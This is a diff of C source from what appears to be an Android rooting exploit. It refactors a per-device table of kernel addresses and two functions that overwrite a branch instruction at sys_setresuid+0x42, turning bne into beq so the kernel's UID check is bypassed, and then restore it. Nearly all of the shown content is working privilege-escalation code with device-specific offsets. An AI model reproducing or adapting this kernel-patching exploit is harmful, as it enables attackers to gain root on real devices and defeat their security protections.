@@ -30,19 +30,19 @@
 typedef struct _supported_device {
   const char *device;
   const char *build_id;
-  unsigned long int set_sysresuid_check_address; /* sys_setresuid + 0x42 */
+  unsigned long int set_sysresuid_check_address;
 } supported_device;
 
 static supported_device supported_devices[] = {
-  { "F-03D",            "V24R33Cc"  , 0xc00e83ce },
-  { "F-11D",            "V21R36A"   , 0xc00fda52 },
-  { "F-11D",            "V24R40A"   , 0xc00fda4e },
-  { "F-11D",            "V26R42B"   , 0xc00fda0a },
-  { "F-12C",            "V21"       , 0xc00e5ad2 },
-  { "IS11N",            "GRJ90"     , 0xc00f0a46 },
-  { "IS17SH",           "01.00.03"  , 0xc01b82e6 },
-  { "ISW11K",           "145.0.0002", 0xc010ae5a },
-  { "URBANO PROGRESSO", "010.0.3000", 0xc0176d82 },
+  { "F-03D",            "V24R33Cc"  , 0xc00e838c },
+  { "F-11D",            "V21R36A"   , 0xc00fda10 },
+  { "F-11D",            "V24R40A"   , 0xc00fda0c },
+  { "F-11D",            "V26R42B"   , 0xc00fdac8 },
+  { "F-12C",            "V21"       , 0xc00e5a90 },
+  { "IS11N",            "GRJ90"     , 0xc00f0a04 },
+  { "IS17SH",           "01.00.03"  , 0xc01b82a4 },
+  { "ISW11K",           "145.0.0002", 0xc010ae18 },
+  { "URBANO PROGRESSO", "010.0.3000", 0xc0176d40 },
 };
 
 static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);
@@ -65,7 +65,7 @@ get_sys_setresuid_check_address_from_kallayms(void)
   while((ret = fscanf(fp, "%x %c %s", &address, &symbol, function)) != EOF) {
     if (!strcmp(function, "sys_setresuid")) {
       fclose(fp);
-      return address + 0x42;
+      return address;
     }
   }
   fclose(fp);
@@ -112,14 +112,14 @@ static bool
 break_sys_setresuid(unsigned long int sys_setresuid_check_address)
 {
   const char beq[] = { 0x00, 0x0a };
-  return inject_command(beq, sys_setresuid_check_address);
+  return inject_command(beq, sys_setresuid_check_address + 0x42);
 }
 
 static bool
 restore_sys_setresuid(unsigned long int sys_setresuid_check_address)
 {
   const char bne[] = { 0x00, 0x1a };
-  return inject_command(bne, sys_setresuid_check_address);
+  return inject_command(bne, sys_setresuid_check_address + 0x42);
 }
 
 int
